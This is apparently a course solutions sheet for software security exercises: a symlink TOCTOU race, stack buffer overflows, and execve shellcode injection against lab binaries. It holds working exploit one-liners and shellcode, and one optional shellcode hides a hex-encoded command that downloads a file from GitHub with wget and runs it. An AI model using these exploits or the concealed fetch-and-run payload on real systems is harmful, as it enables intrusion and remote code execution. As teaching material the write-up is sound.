# Solutions: Software Security I



## Exercise 1: Time-of-check to Time-of-use (TOCTOU)

As hinted in the exercises, the idea is to use a symbolic link and change the
target of the link between the calls to `access` and `open`.
We want to achieve the following sequence of events:

1. We create a symbolic link name `target.txt` to a file `dummy_file.txt` that
   we can read.
2. We run `./toctou target.txt`.
3. The `access` check will be successful.
4. We change the link so that `target.txt` now points to `flag.txt` instead.
5. `toctou` follows the link and prints the content of `flag.txt`.

Since it is very unlikely to get the timing right, if we change the link
manually, we write two scripts try this automatically over and over again.

The following loop changes the destination of the link `target.txt` from
`dummy_file.txt` to `flag.txt` and back (`-s` creates a symbolic link and `-f`
overwrites an existing file):
```bash
while :; do
    ln -sf dummy_file.txt target.txt
    ln -sf flag.txt target.txt
done
```
In parallel we run a second loop where we execute `toctou` with `target.txt` as
argument (`2> /dev/null` removes all error messages from the output, and `|
grep flag` filters the output for lines containing the string "flag").
```bash
while :; do
    ./toctou target.txt
done 2> /dev/null | grep flag
```
When both loops are run in parallel (e.g., in two different terminals), the
second should start printing the contents of `flag.txt`:
```
flag{success!}
flag{success!}
flag{success!}
[...]
```



## Exercise 2: Buffer Overflows

### Part 1: Overflowing a Buffer

We can enter a "name" when prompted by the program.
If the name is short enough, we are greated accordingly and nothing else happens.
```
$ ./overflow1
Please enter your name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
!
x == 42
```
If we choose an even longer input, we may see that there is some garbage data
printed after our "name".
Moreover, the value of `x` has changed to `4141414141414141`.
Since the ASCII value of `A` is `0x41`, we know that our input has overwritten
the variable `x`.
```
$ ./overflow1
Please enter your name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
4þ!
x == 4141414141414141
```
If we choose an even longer input, the program crashes, but that is not
interesting for this exercise.

After trying a bit around, we can see that `x` is changed when we send more
than `0x28 = 40` bytes.
This tells us that the variable `x` is located `0x28 = 40` bytes after the
start of the buffer `name`.

<details>

<summary>Alternative way to find the offset</summary>

We can also look at the disassembly of the program to figure out this offset:
The buffer `name` is located at `[rbp-0x30]` and `x` is stored at `[rbp-0x8]`.
Hence, we have the `0x28` byte offset.

```
$ objdump -M intel -d overflow1
[...]
000000000040116c <vuln>:
  40116c:       55                      push   rbp
  40116d:       48 89 e5                mov    rbp,rsp
  401170:       48 83 ec 30             sub    rsp,0x30
  401174:       48 c7 45 f8 42 00 00    mov    QWORD PTR [rbp-0x8],0x42
  40117b:       00 
  40117c:       48 8d 05 8a 0e 00 00    lea    rax,[rip+0xe8a]        # 40200d <_IO_stdin_used+0xd>
  401183:       48 89 c7                mov    rdi,rax
  401186:       b8 00 00 00 00          mov    eax,0x0
  40118b:       e8 c0 fe ff ff          call   401050 <printf@plt>
  401190:       48 8d 45 d0             lea    rax,[rbp-0x30]         # <---- buffer `name` is referenced here
  401194:       ba 40 01 00 00          mov    edx,0x140
  401199:       48 89 c6                mov    rsi,rax
  40119c:       bf 00 00 00 00          mov    edi,0x0
  4011a1:       e8 ba fe ff ff          call   401060 <read@plt>
  4011a6:       48 8d 45 d0             lea    rax,[rbp-0x30]
  4011aa:       48 89 c6                mov    rsi,rax
  4011ad:       48 8d 05 72 0e 00 00    lea    rax,[rip+0xe72]        # 402026 <_IO_stdin_used+0x26>
  4011b4:       48 89 c7                mov    rdi,rax
  4011b7:       b8 00 00 00 00          mov    eax,0x0
  4011bc:       e8 8f fe ff ff          call   401050 <printf@plt>
  4011c1:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
  4011c5:       48 89 c6                mov    rsi,rax
  4011c8:       48 8d 05 62 0e 00 00    lea    rax,[rip+0xe62]        # 402031 <_IO_stdin_used+0x31>
  4011cf:       48 89 c7                mov    rdi,rax
  4011d2:       b8 00 00 00 00          mov    eax,0x0
  4011d7:       e8 74 fe ff ff          call   401050 <printf@plt>
  4011dc:       48 81 7d f8 37 13 00    cmp    QWORD PTR [rbp-0x8],0x1337   # <---- value of `x` is checked here
  4011e3:       00 
  4011e4:       75 0a                   jne    4011f0 <vuln+0x84>
  4011e6:       b8 00 00 00 00          mov    eax,0x0
  4011eb:       e8 66 ff ff ff          call   401156 <win>
  4011f0:       90                      nop
  4011f1:       c9                      leave  
  4011f2:       c3                      ret
[...]
```

</details>

Now that we now the offset of `x`, we can overwrite it with the required value
`0x1337`.
Since `x` is a 64 bit integer and the architecture is little endian, this
corresponds to the byte sequence `b'\x37\x13\x00\x00\x00\x00\x00\x00'`
(for convenience, we can use the Python function `struct.pack('<Q', 0x1337)` to
obtain this).
```
$ python -c "import os, struct; os.write(1, b'A'*0x28 + struct.pack('<Q', 0x1337))" | ./overflow1 
Please enter your name: Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA7!
x == 1337
Success!
```


### Part 2: Changing the Control Flow


Now we have to overwrite the return address with the address of the function
`win`.
The program tells us the right address.
```
$ ./overflow2
win is located at 0x401156
Please enter your name: 
```
Alternatively, we can also look up the symbol in the binary, e.g., with
```
$ readelf -s overflow2 | grep win
    40: 0000000000401156    22 FUNC    GLOBAL DEFAULT   14 win
```

By looking at the disassembly of the function `vuln`, we find that the buffer
`name` is located at `[rbp-0x20]`.
```
$ objdump -M intel -d overflow2
[...]
000000000040116c <vuln>:
  40116c:       55                      push   rbp
  40116d:       48 89 e5                mov    rbp,rsp
  401170:       48 83 ec 20             sub    rsp,0x20
  401174:       48 8d 05 db ff ff ff    lea    rax,[rip+0xffffffffffffffdb]        # 401156 <win>
  40117b:       48 89 c6                mov    rsi,rax
  40117e:       48 8d 05 88 0e 00 00    lea    rax,[rip+0xe88]        # 40200d <_IO_stdin_used+0xd>
  401185:       48 89 c7                mov    rdi,rax
  401188:       b8 00 00 00 00          mov    eax,0x0
  40118d:       e8 be fe ff ff          call   401050 <printf@plt>
  401192:       48 8d 05 8a 0e 00 00    lea    rax,[rip+0xe8a]        # 402023 <_IO_stdin_used+0x23>
  401199:       48 89 c7                mov    rdi,rax
  40119c:       b8 00 00 00 00          mov    eax,0x0
  4011a1:       e8 aa fe ff ff          call   401050 <printf@plt>
  4011a6:       48 8d 45 e0             lea    rax,[rbp-0x20]         # <---- buffer `name` referenced here
  4011aa:       ba 40 01 00 00          mov    edx,0x140
  4011af:       48 89 c6                mov    rsi,rax
  4011b2:       bf 00 00 00 00          mov    edi,0x0
  4011b7:       e8 a4 fe ff ff          call   401060 <read@plt>
  4011bc:       48 8d 45 e0             lea    rax,[rbp-0x20]         # <---- and here
  4011c0:       48 89 c6                mov    rsi,rax
  4011c3:       48 8d 05 72 0e 00 00    lea    rax,[rip+0xe72]        # 40203c <_IO_stdin_used+0x3c>
  4011ca:       48 89 c7                mov    rdi,rax
  4011cd:       b8 00 00 00 00          mov    eax,0x0
  4011d2:       e8 79 fe ff ff          call   401050 <printf@plt>
  4011d7:       90                      nop
  4011d8:       c9                      leave  
  4011d9:       c3                      ret 
[...]
```
So we know that we find the saved base pointer at offset `0x20` and the return
address at offset `0x28`.
Therefore, sending a payload with the address of `win` at the right offset
results in execution of `win` (before the program crashes):
```
$ python -c "import os, struct; os.write(1, b'A'*0x28 + struct.pack('<Q', 0x401156))" | ./overflow2
win is located at 0x401156
Please enter your name: Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAV@!
Success!
[1]    1619075 done                              python -c  | 
       1619076 segmentation fault (core dumped)  ./overflow2
```


### Bonus Part 3: Executing Shellcode


The program is almost the same as before, but in contrast to `overflow2` there
is no `win` function we can call.
Luckily, the stack of `overflow3` is now executable, so we can inject our own
code into the buffer and execute it.:
```
$ readelf -l overflow2 | grep -A1 STACK
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     0x10
$ readelf -l overflow3 | grep -A1 STACK 
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RWE    0x10
                                                          ^
                                                          |
                                                          E stands for "executable"
```

The code we will inject is commonly called "shellcode", since it is common to
spawn a new shell to be able to execute arbitrary commands.
One example of such a shellcode is given in the exercise.
If we assemble the code, we get the following byte sequence:
```python
shellcode = b'\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\x48\x31\xc0\x50\x48\x89\xe6\x48\x89\xe2\x48\xc7\xc0\x3b\x00\x00\x00\x0f\x05'
```

The program nicely prints us the address of the `name` buffer.
Since Address Space Layout Randomization (ASLR) randomizes the position of the
stack in memory, the address is different in each execution:
```
$ ./overflow3 
name is located at 0x7fff55c5d640
Please enter your name: Hello !
$ ./overflow3
name is located at 0x7ffdcfc67ea0
Please enter your name: Hello !
$ ./overflow3
name is located at 0x7ffcc2501fb0
Please enter your name: Hello !
```
For the purpose of this exercise, we disable ASLR, so that the address is
always the same:
```
$ setarch `uname -m` -R ./overflow3
name is located at 0x7fffffffd770
Please enter your name: Hello !
$ setarch `uname -m` -R ./overflow3
name is located at 0x7fffffffd770
Please enter your name: Hello !
$ setarch `uname -m` -R ./overflow3
name is located at 0x7fffffffd770
Please enter your name: Hello !
```


Using this address, we craft our input as follows:
First we fill the buffer with `B`s, then we overwrite the return address with (in this case) `0x7fffffffd770 + 0x30`, and finally we write the shellcode.
Here `0x30` is the offset of the shellcode in the buffer.
```
python -c "import os, struct; os.write(1, b'B'*0x28 + struct.pack('<Q', 0x7fffffffd770 + 0x30) + b'\x48\x31\xC0\x50\x48\x89\xE6\x48\x89\xE2\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x50\x48\x89\xE7\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05')"
```

When we feed this into `overflow3`, nothing visible happens:
```
$ python -c "import os, struct; os.write(1, b'B'*0x28 + struct.pack('<Q', 0x7fffffffd770 + 0x30) + b'\x48\x31\xC0\x50\x48\x89\xE6\x48\x89\xE2\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x50\x48\x89\xE7\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05')" | setarch $(uname -m) -R ./overflow3 
name is located at 0x7fffffffd770
Please enter your name: Hello BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB ×ÿÿÿ!
```
This is because a shell is spawned and immediately closed because the input stream is already closed.
To prevent this, we can use a little trick and run the exploit as follows and can execute arbitrary shell commands:
```
(python -c "import os, struct; os.write(1, b'B'*0x28 + struct.pack('<Q', 0x7fffffffd770 + 0x30) + b'\x48\x31\xC0\x50\x48\x89\xE6\x48\x89\xE2\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x50\x48\x89\xE7\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05')"; cat) | setarch $(uname -m) -R ./overflow3
echo "Success!" # <- this and the following commands are executed by the newly spawned shell
Success!
whoami
lennart
```

<details>

<summary>Another example of a shellcode</summary>

Here is another example of an execve shellcode, that also passes arguments to the executed program.
If you like, you can try to figure out what it does.
```nasm
mov rax, 0x68732f6e69622f
push rax
mov r8, rsp

mov rax, 0x632d
push rax
mov r9, rsp

xor rax, rax
push rax
mov rax, 0x2244242220722d20
push rax
mov rax, 0x6d72202626206469
push rax
mov rax, 0x5f726573755f746e
push rax
mov rax, 0x6972702f2e202626
push rax
mov rax, 0x2064695f72657375
push rax
mov rax, 0x5f746e6972702078
push rax
mov rax, 0x2b20646f6d686320
push rax
mov rax, 0x26262064695f7265
push rax
mov rax, 0x73755f746e697270
push rax
mov rax, 0x2f695f7974697275
push rax
mov rax, 0x6365735f65726177
push rax
mov rax, 0x74666f735f37302f
push rax
mov rax, 0x72657473616d2f77
push rax
mov rax, 0x61722f7365736963
push rax
mov rax, 0x726578652d313265
push rax
mov rax, 0x2d6365737379732d
push rax
mov rax, 0x75612f6472656e65
push rax
mov rax, 0x6c2f6d6f632e6275
push rax
mov rax, 0x687469672f2f3a73
push rax
mov rax, 0x7074746820746567
push rax
mov rax, 0x7720262620224424
push rax
mov rax, 0x2220646320262620
push rax
mov rax, 0x2229642d20706d65
push rax
mov rax, 0x746b6d2824223d44
push rax
mov r10, rsp

mov rdi, r8

xor rax, rax
push rax
mov rdx, rsp
push r10
push r9
push r8
mov rsi, rsp

mov rax, 0x3b
syscall
```

</details>





